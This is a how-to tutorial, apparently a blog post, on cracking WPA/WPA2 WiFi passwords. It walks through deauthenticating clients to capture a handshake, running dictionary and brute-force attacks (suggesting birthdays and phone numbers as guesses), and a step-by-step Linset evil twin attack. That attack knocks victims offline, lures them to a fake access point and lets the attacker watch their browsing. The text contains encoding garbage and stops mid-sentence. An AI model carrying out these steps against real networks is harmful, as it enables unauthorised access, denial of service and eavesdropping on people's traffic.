For all the following attacks I will use [Alfa AWUS052NH](http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&icep_uq=Alfa+AWUS052NH&icep_sellerId=&icep_ex_kw=&icep_sortBy=12&icep_catId=&icep_minPrice=&icep_maxPrice=&ipn=psmain&icep_vectorid=229466&kwid=902099&mtid=824&kw=lg)![img](https://rover.ebay.com/roverimp/1/711-53200-19255-0/1?ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&uq=Alfa+AWUS052NH&mpt=[CACHEBUSTER]).

First, we have to capture Handshake, therefore select тАШ5. Handshake tools menuтАЩ item in the main menu:

Start from 4. Explore for targets (monitor mode needed)тАЩ:

![img](images/20-1613554275465.png)

**The best targets have:**

- clients 
- strong signal 

After I selected the target AP, I enter 5. Capture Handshake:

**We have 3 options:**

1. **Deauth / disassoc amok mdk3 attack** 
2. **Deauth aireplay attack** 
3. **WIDS / WIPS / WDS Confusion attack** 

тАЛ	![img](images/22-1613554280762.png)

Usually I prefer the second option (Deauth aireplay attack), if it failed I try with тАШ1. Deauth / disassoc amok mdk3 attackтАЩ.

Two windows will be opened. One with the Handshake capturer and other with the attack to force clients to reconnect.

Don't close any window manually, script will do when needed. In about  20 seconds maximum you'll know if you've got the Handshake.

I am asked:

```
Did you get the Handshake? (Look at the top right corner of the capture window) [y/n]
```

I got the Handshake.

тАЛ	Next:

```
Type the path to store the file or press [Enter] to accept the default proposal [/root/handshake-00:1E:58:C6:AC:FB.cap]
```

Now I тАШ7. Return to main menuтАЩ and select тАШ6. Offline WPA/WPA2 decrypt menuтАЩ:

![img](images/24-1613554285275.png)

To launch Dictionary attack against capture file I select the first  menu item (тАШ1. (aircrack) Dictionary attack against capture fileтАЩ).

The script reports:

```
You already have selected a capture file during this session [/root/handshake-00:1E:58:C6:AC:FB.cap]`
Do you want to use this already selected capture file? [Y/n] 

You already have selected a BSSID during this session and is present in capture file [00:1E:58:C6:AC:FB]
Do you want to use this already selected BSSID? [Y/n]
```

I agree.

As the path of a dictionary file I enter **/root/newrockyou.txt**.

The Dictionary attack in progress:

If the attack succeeded the string, containing тАШ**KEY FOUND!**тАЩ, will be displayed.

In addition, the script will ask about storing the trophy file:

![img](images/27-1-1613554292619.png)

If the dictionary attack failed, you can try again with another dictionary of use the тАШ**2. (aircrack + crunch) Bruteforce attack against capture file**тАЩ.

I recommend you to try eight digits and ten digits passwords (Numeric  chars). The first ones are Birthday dates (19990210); the second ones  are phone numbers (09341112233).

#### Crack Wifi Password Using Evil Twin Attack Using Wifislax

1. Install WifiSlax in Flash Drive or Pendrive using universal USB installer

2. Start WifiSlax

   a. Click on тАЬChange To English Menu".

   b. Click on тАЬRun with SMP KernelтАЭ

   c. Click on тАЬWifiSlax with KDE Desktop

3. Go to WifiSlax > WPA > Linset (Evil Twin Attack)

4. Linset will Start required Tolls

5. Select Wlan0

6. type тАЬ1тАЭ to select Wlan0

7. Enter тАЬ1тАЭ to select тАЬtodos los canalesтАЭ which means select all channels. We need to search all channels to get all the networks available near you. If you want to hack a particular network whose channel number you know already, select 2 and proceed.

8. All the Available networks will be shown now, wait for 2-3 mins to complete the search and click тАЬCTRL +CтАЭ To stop the search

9. Select the network that you want to hack from the list

10. Enter the number of the network that you want to hack, in my case, I am hacking my own network which is тАЬVirusтАЭ and is located at number 5

11. Now we need to select hostpad, so type тАЬ1тАЭ

12. We need to enter the path of the handshake, there is no need to enter any address, by default it takes some root/micaprura.cap, so just Hit тАЬEnterтАЭ without typing anything.

13. We are going to capture handshake using aircrack-ng, so enter тАЬ1"

14. We need to deactivate the process after the handshake is created, so we need to select тАЬrealizardesaut. masiva al ap objetivoтАЭ that is тАЬ1тАЭ

15. Now Handshake capturing process will start, and 2 windows will open. we need to wait until the handshake is created. You need to capture handshake compulsorily to proceed.

16. After the Handshake is captured, close the de authentication box

17. Select тАЬSiтАЭ which means тАЬYesтАЭ. So, Enter тАЬ1тАЭ

18. Select тАЬInterface Web NutraтАЭ. So, Enter тАЬ1тАЭ

19. Select your Language, I am Selecting тАЬEnglishтАЭ as the content in my country is displayed in English. You can choose accordingly and enter the number

20. Now the main process will start DHCP, fake DNS, AP, deauth all, and wifi info dialog boxes will open. You need to wait until the client is connected to our network.

21. Check out for active clients. The victim cannot access their internet connection until we stop the process. DHCP and deauth all will stop them from receiving any packets which make them shift to another network i.e. our fake access point or fake network signal In this process, A DOS attack is launched and the victim loses their internet connection and the victim seeтАЩs it as тАЬLimited ConnectionтАЭ When you are at this step, you can even eavesdrop on the victim. you can see all the websites they surf, each and every detail is displayed in FAKE DNS
    Now I will show you what happens when the process is started Original network gets disconnected and our newly created fake network with the same name connects to victimтАЩs network and a page popтАЩs up
